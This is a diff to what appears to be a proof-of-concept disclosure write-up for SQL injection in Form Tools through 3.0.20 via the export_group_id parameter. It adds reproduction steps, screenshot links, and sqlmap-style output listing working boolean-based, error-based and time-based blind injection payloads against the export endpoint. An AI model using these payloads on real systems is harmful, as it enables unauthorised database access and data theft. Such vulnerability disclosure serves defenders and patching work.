@@ -28,6 +28,34 @@ XSS triggered and exposing the admin cookie.
 An issue was discovered in Form Tools through 3.0.20.
 SQL Injection can occur via the **export_group_id** field when a low-privileged user (client) try to export a form with data, e.g., manipulation of modules/export_manager/export.php?export_group_id=1&export_group_1_results=all&export_type_id=1
 
+Create data table export using a normal user account by clicking *display*:
+
+![alt text](https://github.com/bernardofsr/CVEs-With-PoC/blob/main/PoCs/Form%20Tools/images/SQLI1.png?raw=true "Special character insertion")
+
+###
 Insertion of the special character **'** to test for possible break in the query and cause database errors:
 
 ![alt text](https://github.com/bernardofsr/CVEs-With-PoC/blob/main/PoCs/Form%20Tools/images/SQLI2.png?raw=true "Special character insertion")
+
+###
+
+The endpoint is vulnerable to the following types of SQL Injection attacks:
+
+```
+> Parameter: export_group_id (GET)
+     
+     Type: boolean-based blind
+     Title: AND boolean-based blind - WHERE or HAVING clause
+     Payload: export_group_id=1 AND 5636=5636&export_group_1_results=all&export_type_id=1
+
+     Type: error-based
+     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+     Payload: export_group_id=1 AND (SELECT 4229 FROM(SELECT COUNT(*),CONCAT(0x717a627171,(SELECT (ELT(4229=4229,1))
+     ),0x716b787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&export_group_1_results=all&
+     export_type_id=1
+
+     Type: time-based blind
+     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+     Payload: export_group_id=1 AND (SELECT 1946 FROM (SELECT(SLEEP(5)))nmeR)&export_group_1_results=all&
+     export_type_id=1
+```
